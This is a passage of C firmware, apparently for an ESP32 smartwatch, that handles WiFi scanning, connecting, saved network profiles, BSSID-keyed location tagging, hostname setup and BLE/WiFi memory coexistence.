    int i = s_ap_i;                       /* sample once: the buffer + its count agree */
    if (out == NULL || idx < 0 || idx >= s_ap_cnt[i]) {
        return false;
    }
    *out = s_ap[i][idx];
    return true;
}

bool nocsif_wifi_authmode_open(uint8_t authmode)
{
    return (wifi_auth_mode_t)authmode == WIFI_AUTH_OPEN;
}

const char *nocsif_wifi_authmode_str(uint8_t authmode)
{
    switch ((wifi_auth_mode_t)authmode) {
        case WIFI_AUTH_OPEN:            return "open";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA3";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI";
        default:                        return "secured";
    }
}

/* ---- saved-profile getters (RAM cache; LVGL-task-safe) ----------------------------- */
int nocsif_wifi_saved_count(void) { return s_sv_cnt; }

/* ---- §4.6 Governor P3 places (BSSID-keyed) — plain reads are LVGL/timer-safe ------------------- */
int nocsif_wifi_saved_index(const char *ssid)
{
    if (ssid == NULL || ssid[0] == '\0') return -1;
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) return i;
    }
    return -1;
}

int nocsif_wifi_place_count(void) { return s_pl_cnt; }

bool nocsif_wifi_place_get(int idx, int32_t *lat_ud, int32_t *lon_ud, char *ssid, size_t ssid_len)
{
    if (idx < 0 || idx >= s_pl_cnt) return false;
    if (lat_ud) *lat_ud = s_pl[idx].lat_ud;
    if (lon_ud) *lon_ud = s_pl[idx].lon_ud;
    if (ssid && ssid_len) snprintf(ssid, ssid_len, "%s", s_pl[idx].ssid);
    return true;
}

static int place_find_bssid(const uint8_t bssid[6])
{
    for (int i = 0; i < s_pl_cnt; i++) {
        if (memcmp(s_pl[i].bssid, bssid, 6) == 0) return i;
    }
    return -1;
}

/* The connected AP's BSSID (esp_wifi_sta_get_ap_info is thread-safe; ~a round trip to the WiFi task). */
static bool connected_bssid(uint8_t out[6])
{
    if (!s_connected) return false;
    wifi_ap_record_t ap;
    if (esp_wifi_sta_get_ap_info(&ap) != ESP_OK) return false;
    memcpy(out, ap.bssid, 6);
    return true;
}

int nocsif_wifi_connected_place(void)
{
    uint8_t b[6];
    return connected_bssid(b) ? place_find_bssid(b) : -1;
}

static void persist_places(void)
{
    nocsif_settings_set_i32("pl_n", s_pl_cnt);
    for (int i = 0; i < s_pl_cnt; i++) {
        char k[12], v[13];
        const uint8_t *b = s_pl[i].bssid;
        snprintf(v, sizeof v, "%02x%02x%02x%02x%02x%02x", b[0], b[1], b[2], b[3], b[4], b[5]);
        snprintf(k, sizeof k, "pl_b%d", i);  nocsif_settings_set_str(k, v);
        snprintf(k, sizeof k, "pl_s%d", i);  nocsif_settings_set_str(k, s_pl[i].ssid);
        snprintf(k, sizeof k, "pl_la%d", i); nocsif_settings_set_i32(k, s_pl[i].lat_ud);
        snprintf(k, sizeof k, "pl_lo%d", i); nocsif_settings_set_i32(k, s_pl[i].lon_ud);
    }
}

static void load_places(void)
{
    s_pl_cnt = nocsif_settings_get_i32("pl_n", 0);
    if (s_pl_cnt < 0) s_pl_cnt = 0;
    if (s_pl_cnt > WIFI_MAX_PLACES) s_pl_cnt = WIFI_MAX_PLACES;
    for (int i = 0; i < s_pl_cnt; i++) {
        char k[12], v[16] = "";
        snprintf(k, sizeof k, "pl_b%d", i);  nocsif_settings_get_str(k, v, sizeof v, "");
        unsigned b[6] = {0};
        if (sscanf(v, "%2x%2x%2x%2x%2x%2x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
            for (int j = 0; j < 6; j++) s_pl[i].bssid[j] = (uint8_t)b[j];
        }
        snprintf(k, sizeof k, "pl_s%d", i);  nocsif_settings_get_str(k, s_pl[i].ssid, sizeof s_pl[i].ssid, "");
        snprintf(k, sizeof k, "pl_la%d", i); s_pl[i].lat_ud = nocsif_settings_get_i32(k, 0);
        snprintf(k, sizeof k, "pl_lo%d", i); s_pl[i].lon_ud = nocsif_settings_get_i32(k, 0);
    }
    if (s_pl_cnt) ESP_LOGI(TAG, "places: %d learned", s_pl_cnt);
}

/* Forgetting a network drops the places learned under its SSID. */
static void places_drop_ssid(const char *ssid)
{
    bool changed = false;
    for (int i = 0; i < s_pl_cnt; ) {
        if (strcmp(s_pl[i].ssid, ssid) == 0) {
            for (int j = i; j < s_pl_cnt - 1; j++) s_pl[j] = s_pl[j + 1];
            s_pl_cnt--;
            changed = true;
        } else {
            i++;
        }
    }
    if (changed) persist_places();
}

/* Worker-side (pinned task — the NVS write belongs here): stamp the CONNECTED AP as a place — a new
 * BSSID inserts (oldest evicted when full), a known one moves only when the fix is GEO_RESTAMP_M away. */
static void do_geo_stamp(int32_t lat_ud, int32_t lon_ud)
{
    uint8_t b[6];
    if ((lat_ud == 0 && lon_ud == 0) || !connected_bssid(b)) return;
    int idx = place_find_bssid(b);
    if (idx >= 0) {
        double mlat = ((double)lat_ud + (double)s_pl[idx].lat_ud) * 0.5e-6 * (3.14159265358979 / 180.0);
        double dy = ((double)lat_ud - (double)s_pl[idx].lat_ud) * 1e-6 * 111320.0;
        double dx = ((double)lon_ud - (double)s_pl[idx].lon_ud) * 1e-6 * 111320.0 * cos(mlat);
        if (sqrt(dx * dx + dy * dy) < GEO_RESTAMP_M) return;              /* same place — keep the stamp */
    } else {
        if (s_pl_cnt < WIFI_MAX_PLACES) {
            idx = s_pl_cnt++;
        } else {                                                           /* full: evict the oldest */
            for (int j = 0; j < WIFI_MAX_PLACES - 1; j++) s_pl[j] = s_pl[j + 1];
            idx = WIFI_MAX_PLACES - 1;
        }
        memcpy(s_pl[idx].bssid, b, 6);
        snprintf(s_pl[idx].ssid, sizeof s_pl[idx].ssid, "%s", s_ssid);
    }
    s_pl[idx].lat_ud = lat_ud;
    s_pl[idx].lon_ud = lon_ud;
    persist_places();
    ESP_LOGI(TAG, "geo: place \"%s\" (%02x:%02x:%02x:%02x:%02x:%02x) learned @ %.5f, %.5f (%d/%d)",
             s_pl[idx].ssid, b[0], b[1], b[2], b[3], b[4], b[5], lat_ud / 1e6, lon_ud / 1e6, s_pl_cnt, WIFI_MAX_PLACES);
}

bool nocsif_wifi_saved_ssid_at(int idx, char *out, size_t len)
{
    if (out == NULL || idx < 0 || idx >= s_sv_cnt) {
        return false;
    }
    snprintf(out, len, "%s", s_sv_ssid[idx]);
    return true;
}

bool nocsif_wifi_is_saved(const char *ssid)
{
    if (ssid == NULL) {
        return false;
    }
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) {
            return true;
        }
    }
    return false;
}

const char *nocsif_wifi_pass_of(const char *ssid)
{
    if (ssid) {
        for (int i = 0; i < s_sv_cnt; i++) {
            if (strcmp(s_sv_ssid[i], ssid) == 0) {
                return s_sv_pass[i];
            }
        }
    }
    return "";
}

/* ---- string state helper ---------------------------------------------------------- */
/* Recompute the compact status + detail line from the current flags. Called after every
 * transition so the UI (which just reads the strings) always reflects reality. */
static void refresh_strings(void)
{
    if (!s_enabled && !s_scanning) {
        publish_status("off");
        publish_detail("WiFi off");
        return;
    }
    if (s_ap_active) {
        char line[80];
        int cli = s_ap_cli_cnt[s_ap_cli_i];
        snprintf(line, sizeof line, "AP \xC2\xB7 %s \xC2\xB7 %d client%s%s",
                 s_ap_ssid[0] ? s_ap_ssid : AP_SSID_DEF, cli, cli == 1 ? "" : "s",
                 s_portal_active ? " \xC2\xB7 portal" : "");
        publish_status(s_portal_active ? "portal" : "ap");
        publish_detail(line);
        return;
    }
    if (s_mon_active || s_pending_monitor) {
        char line[80];
        if (s_mon_hop) {
            snprintf(line, sizeof line, "Monitor \xC2\xB7 hopping 1-13");
        } else {
            snprintf(line, sizeof line, "Monitor \xC2\xB7 ch %d", s_mon_chan);
        }
        publish_status("mon");
        publish_detail(line);
        return;
    }
    if (s_scanning) {
        publish_status("scan");
        publish_detail("Scanning for networks...");   /* "…" */
        return;
    }
    if (s_connected) {
        char tag[24], line[80];
        snprintf(tag, sizeof tag, "%.20s", s_ssid[0] ? s_ssid : "online");
        snprintf(line, sizeof line, "%s \xC2\xB7 %s", s_ssid[0] ? s_ssid : "online", s_ip[s_ip_i]);
        publish_status(tag);
        publish_detail(line);
        return;
    }
    if (s_auth_fail) {
        char line[80];
        snprintf(line, sizeof line, "Wrong password for %.32s", s_ssid);
        publish_status("err");
        publish_detail(line);
        return;
    }
    if (s_want_connect) {
        char line[80];
        snprintf(line, sizeof line, "Joining %.32s...", s_ssid);
        publish_status("join");
        publish_detail(line);
        return;
    }
    publish_status("on");
    publish_detail(s_ssid[0] ? "On \xC2\xB7 not connected" : "On \xC2\xB7 no saved network");
}

/* ---- credential persistence ------------------------------------------------------- */
static void load_creds(void)
{
    nocsif_settings_get_str(K_SSID, s_ssid, sizeof s_ssid, "");
    nocsif_settings_get_str(K_PASS, s_pass, sizeof s_pass, "");
    if (s_ssid[0]) {
        ESP_LOGI(TAG, "saved network: \"%s\"", s_ssid);
    }
}
static void persist_creds(void)
{
    nocsif_settings_set_str(K_SSID, s_ssid);
    nocsif_settings_set_str(K_PASS, s_pass);
    ESP_LOGI(TAG, "creds persisted for \"%s\"", s_ssid);
}

/* ---- saved network profiles (SSID + passphrase list) ------------------------------- */
static void persist_saved(void)
{
    nocsif_settings_set_i32(K_SV_CNT, s_sv_cnt);
    for (int i = 0; i < s_sv_cnt; i++) {
        char k[12];
        snprintf(k, sizeof k, "wn_s%d", i); nocsif_settings_set_str(k, s_sv_ssid[i]);
        snprintf(k, sizeof k, "wn_p%d", i); nocsif_settings_set_str(k, s_sv_pass[i]);
    }
}

static void load_saved(void)
{
    s_sv_cnt = nocsif_settings_get_i32(K_SV_CNT, 0);
    if (s_sv_cnt < 0) s_sv_cnt = 0;
    if (s_sv_cnt > WIFI_MAX_SAVED) s_sv_cnt = WIFI_MAX_SAVED;
    for (int i = 0; i < s_sv_cnt; i++) {
        char k[12];
        snprintf(k, sizeof k, "wn_s%d", i); nocsif_settings_get_str(k, s_sv_ssid[i], sizeof s_sv_ssid[i], "");
        snprintf(k, sizeof k, "wn_p%d", i); nocsif_settings_get_str(k, s_sv_pass[i], sizeof s_sv_pass[i], "");
    }
    load_places();                                          /* §4.6 P3: the BSSID-keyed places table */
    /* Migrate the legacy single-slot credential into the list so the current network survives. */
    if (s_sv_cnt == 0 && s_ssid[0]) {
        snprintf(s_sv_ssid[0], sizeof s_sv_ssid[0], "%s", s_ssid);
        snprintf(s_sv_pass[0], sizeof s_sv_pass[0], "%s", s_pass);
        s_sv_cnt = 1;
        persist_saved();
    }
    ESP_LOGI(TAG, "saved networks: %d", s_sv_cnt);
}

/* Remember (or update the passphrase of) a network. Evicts the oldest if the list is full. */
static void upsert_saved(const char *ssid, const char *pass)
{
    if (ssid == NULL || ssid[0] == '\0') {
        return;
    }
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) {
            snprintf(s_sv_pass[i], sizeof s_sv_pass[i], "%s", pass ? pass : "");
            persist_saved();
            return;
        }
    }
    int slot;
    if (s_sv_cnt < WIFI_MAX_SAVED) {
        slot = s_sv_cnt++;
    } else {                                   /* full: drop the oldest (slot 0), shift down */
        for (int j = 0; j < WIFI_MAX_SAVED - 1; j++) {
            memcpy(s_sv_ssid[j], s_sv_ssid[j + 1], sizeof s_sv_ssid[j]);
            memcpy(s_sv_pass[j], s_sv_pass[j + 1], sizeof s_sv_pass[j]);
        }
        places_drop_ssid(s_sv_ssid[WIFI_MAX_SAVED - 1]);    /* the evicted profile takes its places with it */
        slot = WIFI_MAX_SAVED - 1;
    }
    snprintf(s_sv_ssid[slot], sizeof s_sv_ssid[slot], "%s", ssid);
    snprintf(s_sv_pass[slot], sizeof s_sv_pass[slot], "%s", pass ? pass : "");
    persist_saved();
    ESP_LOGI(TAG, "remembered \"%s\" (saved=%d)", ssid, s_sv_cnt);
}

static void remove_saved(const char *ssid)
{
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) {
            for (int j = i; j < s_sv_cnt - 1; j++) {
                memcpy(s_sv_ssid[j], s_sv_ssid[j + 1], sizeof s_sv_ssid[j]);
                memcpy(s_sv_pass[j], s_sv_pass[j + 1], sizeof s_sv_pass[j]);
            }
            s_sv_cnt--;
            persist_saved();
            places_drop_ssid(ssid);                          /* §4.6 P3: its learned places go too */
            return;
        }
    }
}

/* ---- MAC address helpers ----------------------------------------------------------- */
static void format_mac(char *dst, size_t len, const uint8_t m[6])
{
    snprintf(dst, len, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}
/* Read the driver's current STA MAC and publish it for the UI (valid after set_mode(STA)). */
static void publish_current_mac(void)
{
    uint8_t m[6];
    if (esp_wifi_get_mac(WIFI_IF_STA, m) == ESP_OK) {
        char s[18];
        format_mac(s, sizeof s, m);
        publish_mac_str(s);
    }
}

/* ---- hostname (how the watch appears on the network) ------------------------------- */
/* Turn the friendly device name into an RFC-1123-ish hostname: keep [A-Za-z0-9], map runs of
 * space/underscore/other to a single '-', trim leading/trailing '-'. Falls back to the default
 * if nothing usable survives. `out` is always NUL-terminated. */
static void sanitize_hostname(const char *in, char *out, size_t outlen)
{
    size_t j = 0;
    for (size_t i = 0; in && in[i] && j + 1 < outlen; i++) {
        char c = in[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) {
            out[j++] = c;
        } else if (j > 0 && out[j - 1] != '-') {   /* collapse separators to a single '-' */
            out[j++] = '-';
        }
    }
    while (j > 0 && out[j - 1] == '-') {            /* no trailing hyphen */
        j--;
    }
    out[j] = '\0';
    if (j == 0) {
        snprintf(out, outlen, "NocSif-watch");
    }
}

/* Push the sanitized device name onto the STA netif as its DHCP/mDNS hostname (no-op until the
 * netif exists; it's applied at the end of bring_up and again on a rename). */
static void apply_hostname(void)
{
    if (s_netif == NULL) {
        return;
    }
    char host[WIFI_SSID_MAX];
    sanitize_hostname(nocsif_settings_device_name(), host, sizeof host);
    esp_err_t e = esp_netif_set_hostname(s_netif, host);
    if (e != ESP_OK) {
        ESP_LOGW(TAG, "set_hostname('%s'): %s", host, esp_err_to_name(e));
    } else {
        ESP_LOGI(TAG, "hostname = \"%s\"", host);
    }
}

/* ---- connection reason helper ----------------------------------------------------- */
/* A drop that looks like a bad passphrase — stop retrying and tell the user, instead of
 * burning WIFI_MAX_RETRY association attempts on creds that will never work. */
static bool reason_is_auth(uint8_t reason)
{
    switch (reason) {
        case WIFI_REASON_AUTH_FAIL:
        case WIFI_REASON_4WAY_HANDSHAKE_TIMEOUT:
        case WIFI_REASON_MIC_FAILURE:
        case WIFI_REASON_HANDSHAKE_TIMEOUT:
        case WIFI_REASON_AUTH_EXPIRE:
            return true;
        default:
            return false;
    }
}

/* ---- event handlers (system event task) ------------------------------------------- */
static void try_connect(void)          /* connect if we want a link and the STA is up */
{
    if (s_want_connect && s_sta_started) {
        esp_err_t e = esp_wifi_connect();
        if (e != ESP_OK) {
            ESP_LOGW(TAG, "esp_wifi_connect: %s", esp_err_to_name(e));
        }
    }
}

static void start_scan_now(void)
{
    s_scanning = true;
    refresh_strings();
    esp_err_t e = esp_wifi_scan_start(NULL, false);   /* default active scan, non-blocking */
    if (e != ESP_OK) {
        ESP_LOGW(TAG, "scan_start: %s", esp_err_to_name(e));
        s_scanning = false;
        publish_status("err");
        publish_detail("Scan failed to start.");
    }
}

static void on_wifi_evt(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg; (void)base;
    switch (id) {
    case WIFI_EVENT_STA_START:
        s_sta_started = true;
        if (s_pending_scan) { s_pending_scan = false; start_scan_now(); }
        if (s_pending_monitor) { s_pending_monitor = false; enter_promiscuous(); }
        try_connect();
        break;

    case WIFI_EVENT_STA_STOP:
        s_sta_started = false;
        s_connected = false;
        break;

    case WIFI_EVENT_STA_DISCONNECTED: {
        wifi_event_sta_disconnected_t *d = (wifi_event_sta_disconnected_t *)data;
        uint8_t reason = d ? d->reason : 0;
        s_connected = false;
        clear_netinfo();
        if (!s_want_connect) {                 /* a deliberate disconnect — don't retry */
            refresh_strings();
            break;
        }
        if (reason_is_auth(reason)) {          /* fail fast: creds almost certainly wrong */
            ESP_LOGW(TAG, "disconnect reason=%u -> auth failure; not retrying", reason);
            s_auth_fail = true;
            s_want_connect = false;
            s_join_state = NOCSIF_WIFI_JOIN_FAILED;
            refresh_strings();
            break;
        }
        if (s_retry < WIFI_MAX_RETRY) {
            s_retry++;
            ESP_LOGW(TAG, "disconnect reason=%u; reconnect %d/%d", reason, s_retry, WIFI_MAX_RETRY);
            esp_wifi_connect();
        } else {
            ESP_LOGW(TAG, "disconnect reason=%u; giving up after %d tries", reason, s_retry);
            s_want_connect = false;
            s_join_state = NOCSIF_WIFI_JOIN_FAILED;
            publish_status("err");
            char line[80];
            snprintf(line, sizeof line, "Couldn't reach %.32s", s_ssid);
            publish_detail(line);
        }
        break;
    }

    case WIFI_EVENT_SCAN_DONE:
        /* Retrieve records on the worker (off the event task), not here. */
        if (s_q) { wifi_cmd_t c = { .type = CMD_SCAN_DONE }; xQueueSend(s_q, &c, 0); }
        break;

    /* Software AP (M5-P5·3): the ap_tick timer is the single writer of the client snapshot; these
     * events just log the join/leave so a serial trace shows them promptly (the list follows within
     * one refresh tick). */
    case WIFI_EVENT_AP_STACONNECTED: {
        wifi_event_ap_staconnected_t *e = (wifi_event_ap_staconnected_t *)data;
        if (e) {
            ESP_LOGI(TAG, "AP client joined %02x:%02x:%02x:%02x:%02x:%02x (aid %d)",
                     e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid);
        }
        break;
    }
    case WIFI_EVENT_AP_STADISCONNECTED: {
        wifi_event_ap_stadisconnected_t *e = (wifi_event_ap_stadisconnected_t *)data;
        if (e) {
            ESP_LOGI(TAG, "AP client left  %02x:%02x:%02x:%02x:%02x:%02x (aid %d)",
                     e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid);
        }
        break;
    }

    default:
        break;
    }
}

static void on_ip_evt(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg; (void)base;
    if (id != IP_EVENT_STA_GOT_IP) {
        return;
    }
    ip_event_got_ip_t *e = (ip_event_got_ip_t *)data;
    char ip[16], nm[16], gw[16];
    snprintf(ip, sizeof ip, IPSTR, IP2STR(&e->ip_info.ip));
    snprintf(nm, sizeof nm, IPSTR, IP2STR(&e->ip_info.netmask));
    snprintf(gw, sizeof gw, IPSTR, IP2STR(&e->ip_info.gw));
    publish_ip(ip);
    publish_netmask(nm);
    publish_gw(gw);
    s_connected = true;
    s_retry = 0;
    s_auth_fail = false;
    s_join_state = NOCSIF_WIFI_JOIN_CONNECTED;
    ESP_LOGI(TAG, "got IP %s on \"%s\"", ip, s_ssid);
    persist_creds();                        /* only known-good creds reach NVS */
    upsert_saved(s_ssid, s_pass);           /* remember it for the saved-networks list */
    refresh_strings();
}

/* ---- bring-up + started state ----------------------------------------------------- */
/* Lazy one-time init: netif + default event loop + esp_wifi_init + handler registration.
 * NVS is already up (nocsif_settings_init at boot), which esp_wifi needs for PHY cal. */
static bool bring_up(void)
{
    if (s_driver_up) {
        return true;
    }

    /* COEXISTENCE INIT-ORDER GUARD (RAM-BUDGET.md remake #3, C1). The BLE controller must claim its
     * ~31.7 KB contiguous int-DMA block from the pristine boot pool BEFORE esp_wifi_init fragments it —
     * a released block can never be re-claimed once WiFi is up (measured). If Bluetooth is enabled and
     * we are NOT in safe mode, nocsif_ble_boot_reserve MUST already have run. If it hasn't, the boot
     * init order regressed (WiFi came up first) and Bluetooth will be unavailable until reboot — a
     * constraint #1 violation. Log it LOUD; do not silently proceed. */
    if (nocsif_ble_bt_enabled() && !nocsif_reliability_safe_mode() && !nocsif_ble_boot_reserve_ran()) {
        ESP_LOGE(TAG, "COEX INIT-ORDER BUG: esp_wifi_init is about to run but nocsif_ble_boot_reserve "
                      "has NOT run — the BLE controller block will be unreclaimable and Bluetooth will "
                      "need a reboot. Call nocsif_ble_boot_reserve() BEFORE any WiFi bring-up (main.c).");
    }

    esp_err_t e;

    e = esp_netif_init();
    if (e != ESP_OK) { ESP_LOGE(TAG, "esp_netif_init: %s", esp_err_to_name(e)); goto fail; }

    e = esp_event_loop_create_default();
    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {   /* INVALID_STATE = already created */
        ESP_LOGE(TAG, "event loop: %s", esp_err_to_name(e)); goto fail;
    }

    if (s_netif == NULL) {
        s_netif = esp_netif_create_default_wifi_sta();
        if (s_netif == NULL) { ESP_LOGE(TAG, "create_default_wifi_sta failed"); goto fail; }
    }

    /* LEAN PROFILE (BLE⇄WiFi coexistence): the WiFi driver's internal-DMA footprint is fixed at
     * esp_wifi_init() by the BUFFER COUNTS below — it does NOT shrink when the link goes idle, so
     * throttling throughput frees nothing. Re-initialising with a smaller buffer set is what actually
     * returns RAM (~58 KB full vs ~35-40 KB lean), and it is the only way to keep the station
     * ASSOCIATED while handing the BLE controller the ~30 KB CONTIGUOUS block it needs. These fields
     * are runtime members of wifi_init_config_t, so the same binary can do both. Lean costs
     * throughput (no AMPDU RX, tiny queues) — fine for the phone link, weather + time sync; monitor /
     * capture / wardrive should run on the full profile. */
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (s_lean) {
        cfg.static_rx_buf_num  = 2;    /* MAC RX DMA buffers, 1.6 KB each (must be internal)      */
        cfg.dynamic_rx_buf_num = 4;
        cfg.static_tx_buf_num  = 2;    /* 1.6 KB each                                             */
        cfg.cache_tx_buf_num   = 4;
        cfg.rx_mgmt_buf_num    = 2;
        cfg.ampdu_rx_enable    = 0;    /* drops the block-ack reorder buffers entirely            */
        cfg.rx_ba_win          = 0;    /* must be 0 when AMPDU RX is off                          */
    }
    e = esp_wifi_init(&cfg);
    if (e != ESP_OK) { ESP_LOGE(TAG, "esp_wifi_init: %s", esp_err_to_name(e)); goto fail; }
    ESP_LOGI(TAG, "esp_wifi_init (%s profile); int-dma free=%u largest=%u",
             s_lean ? "LEAN" : "full",
             (unsigned)nocsif_int_dma_free(),
             (unsigned)nocsif_int_dma_largest());

    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_event_handler_instance_register(
        WIFI_EVENT, ESP_EVENT_ANY_ID, &on_wifi_evt, NULL, &s_h_wifi));
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_event_handler_instance_register(
        IP_EVENT, IP_EVENT_STA_GOT_IP, &on_ip_evt, NULL, &s_h_ip));

    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_storage(WIFI_STORAGE_RAM));  /* we own the creds */
    publish_current_mac();      /* STA MAC is readable now; the netmenu shows it */
    apply_hostname();           /* how the watch appears on the network (before the first DHCP) */

    s_driver_up = true;
    s_available = true;
    ESP_LOGI(TAG, "esp_wifi initialised (STA); int-dma free=%u",
             (unsigned)nocsif_int_dma_free());
    return true;

fail:
    publish_status("err");
    publish_detail("WiFi init failed.");
    return false;
}

static bool ensure_started(void)
{
    if (s_sta_started) {
        return true;
    }
    esp_err_t e = esp_wifi_start();     /* async: STA_START sets s_sta_started */
    if (e != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_start: %s", esp_err_to_name(e));
        publish_status("err");
        publish_detail("Radio failed to start.");
        return false;
    }
    return true;
}

/* Push s_ssid/s_pass into the driver as the STA config (permissive auth threshold so any
 * AP of that SSID is eligible; the passphrase decides success). */
static void apply_config(void)
{
    wifi_config_t wc = { 0 };
    snprintf((char *)wc.sta.ssid, sizeof wc.sta.ssid, "%s", s_ssid);
    snprintf((char *)wc.sta.password, sizeof wc.sta.password, "%s", s_pass);
    wc.sta.threshold.authmode = WIFI_AUTH_OPEN;   /* accept any; passphrase gates the join */
    wc.sta.scan_method = WIFI_ALL_CHANNEL_SCAN;
    wc.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_STA, &wc));
}

/* ---- worker command handlers ------------------------------------------------------ */
static void do_enable(void)
{
    /* BLE never yields WiFi any more (the controller is reserved at boot and resident for the session),
     * so there is no "reclaim the radio from the phone link" dance — just bring the driver up. */
    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }     /* single radio: STA use ends the AP */
    s_enabled = true;
    s_want_connect = (s_ssid[0] != '\0') && s_autojoin;   /* auto-reconnect a saved net iff opted in */
    if (s_want_connect) {
        s_retry = 0;
        s_auth_fail = false;
        s_join_state = NOCSIF_WIFI_JOIN_JOINING;
        apply_config();
    }
    ensure_started();       /* STA_START fires -> try_connect() joins the saved net */
    if (s_sta_started) {    /* already started (re-enable) -> connect now */
        try_connect();
    }
    refresh_strings();
}

static void do_disable(void)
{
    if (s_ap_active) { ap_teardown(); }   /* powering off also ends the software AP */
    monitor_teardown();     /* stop capture if running (powering off; no STA restore) */
    s_want_connect = false;
    s_enabled = false;
    s_connected = false;
    s_scanning = false;
    s_join_state = NOCSIF_WIFI_JOIN_IDLE;
    clear_netinfo();
    if (s_sta_started) {
        esp_wifi_disconnect();
        esp_wifi_stop();    /* STA_STOP clears s_sta_started */
    }
    refresh_strings();
}

/* Arm the lean/full buffer profile. BOOT-TIME input only (RAM-BUDGET.md remake #5/#9): the driver's
 * int-DMA footprint is fixed at the single esp_wifi_init, and a runtime swap would tear the driver down
 * and re-init it — the exact fragmentation churn the resident-block architecture exists to avoid, and it
 * cannot re-widen the contiguous hole anyway (measured). So this only sets the flag the next bring-up
 * reads; if the driver is already up the change is ignored (a reboot would be needed to apply it, and
 * lean is always correct while Bluetooth is on). The old yield-based runtime re-init is gone. */
static void do_lean_set(bool lean)
{
    if (s_lean == lean) {
        return;
    }
    if (s_driver_up) {
        ESP_LOGW(TAG, "WiFi %s profile requested at runtime — ignored (fixed at init; already %s)",
                 lean ? "LEAN" : "full", s_lean ? "LEAN" : "full");
        return;
    }
    s_lean = lean;
    ESP_LOGI(TAG, "WiFi %s profile armed (applies at the next bring-up)", lean ? "LEAN" : "full");
}

static void do_scan(void)
{
    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }   /* single radio: a scan ends the AP */
    s_enabled = true;           /* a scan powers the radio */
    if (!ensure_started()) {
        return;
    }
    if (s_sta_started) {
        start_scan_now();
    } else {
        s_pending_scan = true;  /* STA_START will kick it off */
        refresh_strings();
    }
}

static void do_scan_done(void)
{
    uint16_t num = 0;
    esp_wifi_scan_get_ap_num(&num);
    uint16_t want = (num > WIFI_MAX_AP) ? WIFI_MAX_AP : num;
    esp_err_t e = esp_wifi_scan_get_ap_records(&want, s_recs);   /* frees the internal list */
    if (e != ESP_OK) {
        ESP_LOGW(TAG, "scan_get_ap_records: %s", esp_err_to_name(e));
        want = 0;
    }

    /* Sort by RSSI (desc), then dedup by SSID keeping the strongest, into the back buffer. */
    for (int i = 1; i < want; i++) {              /* insertion sort on s_recs */
        wifi_ap_record_t key = s_recs[i];
        int j = i - 1;
        while (j >= 0 && s_recs[j].rssi < key.rssi) { s_recs[j + 1] = s_recs[j]; j--; }
        s_recs[j + 1] = key;
    }

    int w = s_ap_i ^ 1;
    int n = 0;
    for (int i = 0; i < want && n < WIFI_MAX_AP; i++) {
        const char *ssid = (const char *)s_recs[i].ssid;
        bool dup = false;
        for (int k = 0; k < n; k++) {
            if (ssid[0] && strncmp(s_ap[w][k].ssid, ssid, sizeof s_ap[w][k].ssid) == 0) { dup = true; break; }
        }
        if (dup) {
            continue;
        }
        snprintf(s_ap[w][n].ssid, sizeof s_ap[w][n].ssid, "%s", ssid);
        s_ap[w][n].rssi     = s_recs[i].rssi;
        s_ap[w][n].authmode = (uint8_t)s_recs[i].authmode;
        s_ap[w][n].channel  = s_recs[i].primary;
        n++;
    }
    s_ap_cnt[w] = n;
    s_ap_i = w;                 /* publish the snapshot atomically */
    s_scan_gen++;
    s_scanning = false;
    ESP_LOGI(TAG, "scan done: %u found, %d shown", (unsigned)num, n);
    refresh_strings();
}

static void do_connect(const char *ssid, const char *pass)
{
    if (ssid == NULL || ssid[0] == '\0') {
        return;
    }
    snprintf(s_ssid, sizeof s_ssid, "%s", ssid);
    snprintf(s_pass, sizeof s_pass, "%s", pass ? pass : "");
    s_retry = 0;
    s_auth_fail = false;
    s_want_connect = true;
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;

    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }   /* single radio: a join ends the AP */
    s_enabled = true;
    apply_config();
    if (!ensure_started()) {
        return;
    }
    if (s_sta_started) {
        if (s_connected) {
            esp_wifi_disconnect();   /* switching networks: drop the old link; the disconnect
                                        handler reconnects to the new config (want_connect stays true) */
        } else {
            try_connect();           /* idle + started -> connect to the new network now */
        }
    }                                /* not started yet -> STA_START will connect */
    refresh_strings();
}

static void do_disconnect(void)
{
    s_want_connect = false;
    s_connected = false;
    s_join_state = NOCSIF_WIFI_JOIN_IDLE;
    clear_netinfo();
    if (s_sta_started) {
        esp_wifi_disconnect();
    }
    refresh_strings();
}

static void do_forget(void)
{
    s_ssid[0] = '\0';
    s_pass[0] = '\0';
